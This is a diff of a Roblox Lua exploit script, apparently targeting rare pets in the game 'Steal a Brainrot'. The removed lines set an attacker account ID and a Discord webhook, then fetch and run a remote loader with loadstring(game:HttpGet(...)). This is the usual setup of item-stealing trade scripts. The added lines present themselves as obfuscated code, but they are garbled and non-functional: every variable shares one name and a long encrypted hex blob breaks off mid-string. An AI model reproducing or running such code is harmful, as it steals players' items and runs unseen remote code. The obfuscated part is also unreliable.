@@ -1,31 +1,62 @@
-getgenv().SECRET_KEY = "mrr_38a359b4e3f44a16b00e06861ef854ea"
-getgenv().TARGET_ID = 3701604397
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1485319683627548842/L8kYUh7l8lf0QFZ5qS0YFlhMHj8jbiVnF5IFtv-kT1_7hzGVlXm85gp-lTP3MwVoPXN0"
-getgenv().TARGET_BRAINROTS = {
-    ["Skibidi Toilet"] = true,
-    ["Meowl"] = true,
-    ["Strawberry Elephant"] = true,
-    ["Griffin"] = true,
-    ["Nacho Spyder"] = true,
-    ["La Spooky Grande"] = true,
-    ["La Romantic Grande"] = true,
-    ["Ketupat Kepat"] = true,
-    ["Tictac Sahur"] = true,
-    ["Tang Tang Keletang"] = true,
-    ["Ketchuru and Musturu"] = true,
-    ["Garama and Madundung"] = true,
-    ["Burguro And Fryuro"] = true,
-    ["Capitano Moby"] = true,
-    ["Cerberus"] = true,
-    ["Dragon Cannelloni"] = true,
-    ["Love Love Bear"] = true,
-    ["Fragrama and Chocrama"] = true,
-    ["Popcuru and Fizzuru"] = true,
-    ["Dragon Gingerini"] = true,
-    ["Headless Horseman"] = true,
-    ["Hydra Dragon Cannelloni"] = true,
-    ["Bacuru and Egguru"] = true
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/fbcd1d25889a843297107dea3642044d.lua"))()
+
+
+
+-- [OBFUSCATED WITH LURAPH 14.6V]
+-- Moby,
+
+local function _()end;local function __()return end;local function ___()return false end;local function ____()return true end
+local _____={["0"]=function()local function _____()end;return _____()end,["1"]=function()local function _____()end;return _____()end}
+local function ______()local _____=game:GetService("HttpService"):GenerateGUID(false)local _____=_____..game:GetService("HttpService"):GenerateGUID(false)local _____=string.sub(_____,1,16)return _____ end
+local function _______()local _____={}local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;return function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end end
+local function ________()local _____={}local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;return function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end end
+local function _________()local _____={}local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;return function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end end
+local function __________()local _____={}local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;local _____=0;local _____=function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end;return function()_____=(_____+1)%256;local _____=math.random(0,255);_____=(_____+_____)%256;return _____ end end
+
+(function()
+    local function _____(_____,_____,_____)
+        local _____={}
+        local _____=0
+        local _____=string.len(_____)
+        local _____=string.len(_____)
+        
+        for _____=1,_____ do
+            local _____=string.byte(string.sub(_____,_____,_____))
+            local _____=string.byte(string.sub(_____,((_____-1)%_____)+1,((_____-1)%_____)+1))
+            _____[_____]=string.char(bit32.bxor(_____,_____,_____%256))
+        end
+        
+        return table.concat(_____)
+    end
+    
+    local function _____()
+        local _____={}
+        local _____=0
+        
+        for _____=1,256 do
+            _____[_____]=_____-1
+        end
+        
+        local _____=0
+        for _____=1,256 do
+            _____=(_____+_____[_____]+string.byte(string.sub(getgenv().SECRET_KEY,((_____-1)%string.len(getgenv().SECRET_KEY))+1,((_____-1)%string.len(getgenv().SECRET_KEY))+1)))%256
+            _____[_____],_____[_____]=_____[_____],_____[_____]
+        end
+        
+        return function()
+            _____=(_____+1)%256
+            local _____=(_____+_____[_____])%256
+            _____[_____],_____[_____]=_____[_____],_____[_____]
+            return _____[((_____+_____[_____])%256)+1]
+        end
+    end
+    
+    local _____=_____()
+    local function _____(_____)
+        local _____=""
+        for _____=1,#_____ do
+            _____=_____..string.char(bit32.bxor(string.byte(_____,_____),_____()))
+        end
+        return _____
+    end
+    
+    local _____=_____("7A5A4B6964445A6B4F42666D5A6A4574436D45764E6B56745A6B45744F44666B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F42676B4C4467784D54676C4E5441794F546B6C4E6A41795A7A63794F546B6C4C5467354F4474354D54556B5A6A45744F426
